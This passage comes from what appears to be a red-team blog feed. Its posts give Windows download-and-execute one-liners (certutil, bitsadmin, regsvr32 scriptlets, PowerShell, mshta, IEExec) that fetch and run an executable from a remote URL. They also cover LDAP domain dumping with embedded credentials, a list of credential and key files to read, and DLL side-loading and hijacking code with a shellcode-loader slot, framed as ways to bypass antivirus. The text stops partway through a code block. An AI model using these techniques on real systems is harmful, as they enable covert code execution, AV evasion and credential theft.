class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre class="line-numbers language-none"><code class="language-none">certutil -urlcache -split -f https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe C:\test\yang.exe&amp;&amp;C:\test\yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><pre class="line-numbers language-none"><code class="language-none">Slow, not recommendedbitsadmin &#x2F;transfer n https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe C:\test\yang.exe &amp;&amp; C:\test\yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h3><pre class="line-numbers language-none"><code class="language-none">Run the regsve32-vbs-download-execregsvr32 &#x2F;s &#x2F;i:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;download.sct   scrobj.dllUse this:Const adTypeBinary &#x3D; 1Const adSaveCreateOverWrite &#x3D; 2Dim http,adoSet http &#x3D; CreateObject(&quot;Msxml2.ServerXMLHTTP.6.0&quot;)http.SetOption 2, 13056http.open &quot;GET&quot;,&quot;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&quot;,Falsehttp.sendSet ado &#x3D; createobject(&quot;Adodb.Stream&quot;)ado.Type &#x3D; adTypeBinaryado.Openado.Write http.responseBodyado.SaveToFile &quot;C:\test\yang.exe&quot;ado.Close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723213650376.png"></p><pre class="line-numbers language-none"><code class="language-none">Run the regsve32-JS-ps-download-execregsvr32 &#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;download.sct scrobj.dllUse this:new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;c:\\test\\yang.exe&#39;);start-process &#39;c:\\test\\yang.exe&#39;&quot;,0,true);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h3><pre class="line-numbers language-none"><code class="language-none">Mshta supports http&amp;https, where the script must be an HTML page to run, otherwise it will be parsed as textThe local environment is used as an examplemshta http:&#x2F;&#x2F;127.0.0.1&#x2F;calc.hta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723222036052.png"></p><pre class="line-numbers language-none"><code class="language-none">Make sure the download executes successfully to PowerShellpowershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;C:\test\yang.exe&#39;);start-process &#39;C:\test\yang.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723222405255.png"></p><h3 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h3><pre class="line-numbers language-none"><code class="language-none">Encountered pit point, not yet solved, later reviewcd C:\Windows\Microsoft.NET\Framework\v2.0.50727\caspol -s offIEExec http:&#x2F;&#x2F;192.168.3.8&#x2F;yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723223302420.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> File download </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Supplementary information about obtaining LDAP information</title>
      <link href="2021/07/23/supplementary-information-about-obtaining-ldap-information/"/>
      <url>2021/07/23/supplementary-information-about-obtaining-ldap-information/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">The project encountered a pit point, some complement, the method of obtaining information to complement, in order to better bypass AV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="csvde"><a href="#csvde" class="headerlink" title="csvde"></a>csvde</h2><pre class="line-numbers language-none"><code class="language-none">The target information is exported, and the output product is in CSV format. The actual Chinese exported will have garbled charactersMain applicable versions:Windows Server 2003, Windows Server 2008, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8Operation Manual:https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;it-pro&#x2F;windows-server-2012-r2-and-2012&#x2F;cc732101(v&#x3D;ws.11)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">All information in the domain:csvde -f 1.csvInformation about all users in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot;Information about all machines in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot;Information about all groups in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;group))&quot;Information about all administrator groups in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot;All OU information in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot;All domain user names in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountNameAll computer names in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l nameRemote export:Csvde -s 192.168.3.144 -a rootkit.org\sqladmin Admin12345 -f all.csv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ldifde"><a href="#ldifde" class="headerlink" title="ldifde"></a>ldifde</h2><pre class="line-numbers language-none"><code class="language-none">Main applicable versions:Windows Server 2003, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8Operation Manual:https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;it-pro&#x2F;windows-server-2012-r2-and-2012&#x2F;cc731033(v&#x3D;ws.11)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152525595.png" alt="image"></p><h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">All information in the domain:ldifde -f 2.txtInformation about all users in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -f 2.txtInformation about all machines in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -f 2.txtInformation about all groups in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;group))&quot; -f 2.txtInformation about all administrator groups in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot; -f 2.txtAll OU information in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot; -f 2.txtAll domain user names in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountName -f 2.txtAll computer names in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l name -f 2.txtRemote export:Ldifde -s 192.168.3.144 -a rootkit.org\sqladmin Admin12345 -f 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152733426.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> Intranet Information Collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xwizard Microsoft program use white and black</title>
      <link href="2021/07/23/xwizard-microsoft-program-use-white-and-black/"/>
      <url>2021/07/23/xwizard-microsoft-program-use-white-and-black/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">xwizard.exe use xwizards.dll，Support win7 and above system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145222987.png" alt="image"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">such as Path: C:\Windows\System32Use case:xwizard processXMLFile 1.txtxwizard RunWizard &#x2F;u &#123;11111111-1111-1111-1111-111111111111&#125;xwizard RunPropertySheet &#x2F;u &#123;11111111-1111-1111-1111-111111111111&#125;Note that the GUID length needs to be fixed, otherwise an error will be reported<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210722160656515.png" alt="image"></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">The popover code is as follows:#include &quot;pch.h&quot;#includeBOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:MessageBox(NULL, &quot;yyy&quot;, &quot;y&quot;, MB_OK);WinExec(&quot;calc.exe&quot;, SW_HIDE);case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;Running the program directly will not trigger the popover<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145554786.png" alt="image"></p><pre class="line-numbers language-none"><code class="language-none">Confirm that the popover can be triggered after the normal call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145658925.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145709773.png" alt="image"></p><pre class="line-numbers language-none"><code class="language-none">Must conform to the relevant grammatical structure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145815560.png" alt="image"></p><pre class="line-numbers language-none"><code class="language-none">Note that you need to distinguish between 64 and 32 bits!!In the same way, you can run the program here and you can go online，The basic operations are omitted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sensitive path information concerns</title>
      <link href="2021/07/21/sensitive-path-information-concerns/"/>
      <url>2021/07/21/sensitive-path-information-concerns/</url>
      
        <content type="html"><![CDATA[<h6 id="If-there-is-insufficient-the-follow-up-to-continue"><a href="#If-there-is-insufficient-the-follow-up-to-continue" class="headerlink" title="If there is insufficient, the follow-up to continue"></a>If there is insufficient, the follow-up to continue</h6><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="apache-amp-apache2"><a href="#apache-amp-apache2" class="headerlink" title="apache&amp;apache2"></a>apache&amp;apache2</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;apache&#x2F;httpd.conf&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;etc&#x2F;httpd&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf&#x2F;home&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;etc&#x2F;rc.local &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf  web file&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F; config file&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F; all config file&#x2F;etc&#x2F;apache2&#x2F;apache2.conf Apache config file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;mounts File system list&#x2F;proc&#x2F;cpuinfo CPU&#x2F;proc&#x2F;meminfo memory&#x2F;proc&#x2F;self -&gt; pid information&#x2F;proc&#x2F;self&#x2F;environ environment variable&#x2F;proc&#x2F;[pid]&#x2F;cmdline Process start parameter  such as &#x2F;proc&#x2F;1&#x2F;cmdline&#x2F;proc&#x2F;[pid]&#x2F;mountinfo Information about the file system mount&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;[fd] The file that the process opened&#x2F;proc&#x2F;[pid]&#x2F;exe An exe file that points to the process&#x2F;proc&#x2F;config.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;hosts.deny &#x2F;etc&#x2F;bashrc &#x2F;etc&#x2F;issue &#x2F;etc&#x2F;issue&#x2F;net &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;termcap &#x2F;etc&#x2F;xinetd.d&#x2F;etc&#x2F;mtab &#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf&#x2F;etc&#x2F;xinetd.conf &#x2F;etc&#x2F;protocols &#x2F;etc&#x2F;logrotate.conf &#x2F;etc&#x2F;ld.so.conf &#x2F;etc&#x2F;resolv.conf &#x2F;etc&#x2F;sysconfig&#x2F;network&#x2F;etc&#x2F;sendmail.cf&#x2F;etc&#x2F;sendmail.cw <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Root-permission-required"><a href="#Root-permission-required" class="headerlink" title="Root permission required"></a>Root permission required</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys&#x2F;root&#x2F;.ssh&#x2F;id_rsa&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub&#x2F;root&#x2F;.ssh&#x2F;known_hosts&#x2F;root&#x2F;.bash_history&#x2F;root&#x2F;.mysql_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><pre class="line-numbers language-none"><code class="language-none">c:\boot.inic:\windows\systems32\inetsrv\MetaBase.xmlc:\windows\repair\samC:\windows\system32\config\sam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Information collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL hijacking the whitelist application online</title>
      <link href="2021/07/20/dll-hijacking-the-whitelist-application-online/"/>
      <url>2021/07/20/dll-hijacking-the-whitelist-application-online/</url>
      
        <content type="html"><![CDATA[<h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>Application EXE unsigned white program, call their own compiled black DLL, here to QQ housekeeper function as a case, the implementation of the source code is as follows</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">extern &quot;C&quot; __declspec(dllexport) void test();DWORD WINAPI DDOS(LPVOID lpParameter)&#123;your shellcode loader&#125;staticHMODULE g_OldModule &#x3D; NULL;VOID WINAPI Free()&#123;if (g_OldModule)&#123;FreeLibrary(g_OldModule);&#125;&#125;BOOL WINAPI Load()&#123;TCHAR tzPath[MAX_PATH];TCHAR tzTemp[MAX_PATH * 2];&#x2F;&#x2F;GetModuleFileName(NULL,tzPath,MAX_PATH); &#x2F;&#x2F;PathRemoveFileSpec(tzPath);GetSystemDirectory(tzPath, MAX_PATH); lstrcat(tzPath, TEXT(&quot;\\dllname.dll&quot;));g_OldModule &#x3D; LoadLibrary(tzPath);if (g_OldModule &#x3D;&#x3D; NULL)&#123;wsprintf(tzTemp, TEXT(&quot;无法找到模块 %s,程序无法正常运行&quot;), tzPath);MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);&#125;return (g_OldModule !&#x3D; NULL);&#125;FARPROC WINAPI GetAddress(PCSTR pszProcName)&#123;FARPROC fpAddress;CHAR szProcName[64];TCHAR tzTemp[MAX_PATH];fpAddress &#x3D; GetProcAddress(g_OldModule, pszProcName);if (fpAddress &#x3D;&#x3D; NULL)&#123;if (HIWORD(pszProcName) &#x3D;&#x3D; 0)&#123;wsprintfA(szProcName, &quot;#%d&quot;, pszProcName);pszProcName &#x3D; szProcName;&#125;wsprintf(tzTemp, TEXT(&quot;无法找到函数 %hs,程序无法正常运行&quot;), pszProcName);MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);ExitProcess(-2);&#125;return fpAddress;&#125;BOOL WINAPI Init()&#123;pfnAheadLib_GetVgaAllInfo &#x3D; GetAddress(&quot;GetVgaAllInfo&quot;);pfnAheadLib_GetVgaTemp &#x3D; GetAddress(&quot;GetVgaTemp&quot;);return TRUE;&#125;DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)&#123;HANDLE hProcess;PVOID addr1 &#x3D; reinterpret_cast&lt;PVOID&gt;(0x00401000);BYTE data1[] &#x3D; &#123; 0x90, 0x90, 0x90, 0x90 &#125;;hProcess &#x3D; OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());if (hProcess)&#123;WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);CloseHandle(hProcess);&#125;return 0;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)&#123;HANDLE threadHandle;threadHandle &#x3D; CreateThread(NULL, 0, DDOS, NULL, 0, NULL);if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)&#123;DisableThreadLibraryCalls(hModule);if (Load() &amp;&amp; Init())&#123;TCHAR szAppName[MAX_PATH] &#x3D; TEXT(&quot;MyApp.exe&quot;);TCHAR szCurName[MAX_PATH];GetModuleFileName(NULL, szCurName, MAX_PATH);PathStripPath(szCurName);if (StrCmpI(szCurName, szAppName) &#x3D;&#x3D; 0)&#123;HANDLE hThread &#x3D; CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);if (hThread)&#123;CloseHandle(hThread);&#125;&#125;&#125;&#125;else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)&#123;Free();&#125;return TRUE;&#125;EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaAllInfo(void)&#123;__asm jmp pfnAheadLib_GetVgaAllInfo;&#125;EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaTemp(void)&#123;__asm jmp pfnAheadLib_GetVgaTemp;&#125;void test()&#123;MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, MB_OK);HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;dllname.dll&quot;);if (hDllInst)&#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc)&#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Final-result"><a href="#Final-result" class="headerlink" title="Final result"></a>Final result</h2><p>Use the signed white program to call the black DLL successfully online the target machine</p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL hijacking from hijacking to on-line</title>
      <link href="2021/07/19/dll-hijacking-from-hijacking-to-on-line/"/>
      <url>2021/07/19/dll-hijacking-from-hijacking-to-on-line/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">用中文写下理论知识，避免翻译的会看不懂了DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。DLL劫持，通过一些手段来劫持或者替换正常的DLL，从而加载编译好的恶意DLL漏洞成因，调用loadlibrary可使用DLL的相对路径，这是系统会按照特定的顺序搜索一些目录，便于确认DLL的路径，根据官方文档的定义，在使用相对路径调用loadlibrary时，系统会依次从下方6个路径去寻找所需要的DLL程序所在目录加载 DLL 时所在的当前目录系统目录即SYSTEM32目录16位系统目录即SYSTEM目录Windows目录PATH环境变量中列出的目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Easy-Study"><a href="#Easy-Study" class="headerlink" title="Easy Study"></a>Easy Study</h2><pre class="line-numbers language-none"><code class="language-none">A lot of basic grammar is required here, so I won&#39;t go into detail hereHere use forward to implementationProgram A calls the function in AAA.dll, now change the AAA.dll to AAA_o.dll, then write A new AAA.dll and forward the original function to AAA_o.dllThe DLL is as follows. You need to write an EXE to call the DLL and its functionsaaa.dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;aaa.dll success&quot;, L&quot;s&quot;, 0); &#125;the successful call has the following effect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png" alt="1"></p><pre class="line-numbers language-none"><code class="language-none">Take a look at the export function and confirm the test export function<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/DLL%20hijacking%20from%20hijacking%20to%20on-line/2.png" alt="2"></p><pre class="line-numbers language-none"><code class="language-none">new dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:WinExec(&quot;calc.exe&quot;, SW_HIDE); case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;SUCCESS&quot;, L&quot;SSSSS&quot;, 0); HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa_o.dll&quot;);if (hDllInst) &#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc) &#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;The effect after hijacking is as followsA different way to use precompilation is much faster#pragma comment(linker, &quot;&#x2F;EXPORT:&lt;Function name&gt;&#x3D;&lt;Dll name&gt;.&lt;Function name&gt;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/DLL%20hijacking%20from%20hijacking%20to%20on-line/3.png" alt="3"></p><h2 id="How-to-Online"><a href="#How-to-Online" class="headerlink" title="How to Online"></a>How to Online</h2><pre class="line-numbers language-none"><code class="language-none">extern &quot;C&quot; __declspec(dllexport) void test();DWORD WINAPI DoSC(LPVOID lpParameter)&#123;Like you SC loader&#125;BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)&#123;switch 